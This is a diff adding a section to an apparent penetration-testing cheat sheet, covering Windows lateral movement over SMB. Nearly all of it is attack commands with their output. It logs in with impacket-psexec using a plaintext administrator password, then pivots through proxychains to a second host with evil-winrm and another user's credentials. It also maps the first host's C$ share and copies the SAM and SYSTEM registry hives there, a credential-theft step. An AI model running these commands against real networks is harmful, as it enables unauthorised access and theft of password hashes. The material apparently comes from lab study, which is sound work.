@@ -1800,6 +1800,41 @@ Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
 ````
 Access is denied. In this case try Invoke-WebRequest for powershell
 ````
+### SMB Shares Windows to Windows
+````
+In this situation we have logged onto computer A
+sudo impacket-psexec Administrator:'December31'@192.168.203.141 cmd.exe
+C:\Windows\system32> ipconfig
+ 
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.203.141
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.203.254
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.93.141
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . :
+   
+ Via Computer A we pivot to Computer B (internal IP) with these creds
+ proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
+````
+#### Accessing $C Drive of Computer A
+````
+*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Administrator December31
+````
+#### Copying over files
+````
+*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
+*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
+````
 ### SMB Server Bi-directional
 ````
 impacket-smbserver -smb2support Share .
